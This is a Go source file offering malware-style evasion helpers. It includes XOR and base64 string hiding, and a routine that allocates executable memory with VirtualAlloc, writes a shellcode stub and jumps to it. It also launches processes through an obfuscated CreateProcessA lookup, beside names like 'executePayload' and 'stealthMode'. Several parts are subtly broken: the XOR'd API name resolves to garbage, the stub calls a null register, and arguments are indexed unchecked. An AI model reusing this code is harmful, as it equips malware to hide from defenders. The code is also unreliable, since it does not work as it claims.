package obfuscation

import (
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"syscall"
	"unsafe"
)

// Simple XOR-based string obfuscation
func xorEncryptDecrypt(input string, key byte) string {
	output := make([]byte, len(input))
	for i := range input {
		output[i] = input[i] ^ key
	}
	return string(output)
}

// Base64 encode & decode to hide strings
func encodeString(input string) string {
	return base64.StdEncoding.EncodeToString([]byte(input))
}

func decodeString(input string) string {
	decoded, _ := base64.StdEncoding.DecodeString(input)
	return string(decoded)
}

// Syscall obfuscation (example using indirect call)
func indirectSyscall(sysid uintptr, args ...uintptr) uintptr {
	// Allocate memory for shellcode
	addr, _, _ := syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualAlloc").Call(
		0, 4096, 0x3000, 0x40,
	)

	// Copy syscall stub into allocated memory
	syscallStub := []byte{0xB8, byte(sysid), 0x00, 0x00, 0x00, 0xBA, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xD2}
	copy((*[12]byte)(unsafe.Pointer(addr))[:], syscallStub)

	// Execute syscall via function pointer
	ret, _, _ := syscall.Syscall(addr, uintptr(len(args)), args[0], args[1], args[2])
	return ret
}

// Function name obfuscation using randomized mapping
func obfuscatedFunc() string {
	names := []string{"runProcess", "executePayload", "stealthMode"}
	randIndex := make([]byte, 1)
	rand.Read(randIndex)
	return names[int(randIndex[0])%len(names)]
}

// Example: Obfuscating Windows API calls
func hiddenCreateProcess(processName string) {
	procCreateProcess := xorEncryptDecrypt("CreateProcessA", 0x55) // Obfuscated function name
	createProc := syscall.NewLazyDLL("kernel32.dll").NewProc(procCreateProcess)
	createProc.Call(uintptr(unsafe.Pointer(syscall.StringBytePtr(processName))), 0, 0, 0, 0, 0, 0, 0, 0, 0)
}

// Test obfuscation methods
func TestObfuscation() {
	// Test string obfuscation
	original := "HelloWorld"
	encoded := encodeString(original)
	decoded := decodeString(encoded)

	fmt.Println("Original:", original)
	fmt.Println("Encoded:", encoded)
	fmt.Println("Decoded:", decoded)

	// Test function obfuscation
	fmt.Println("Obfuscated Function Name:", obfuscatedFunc())
}
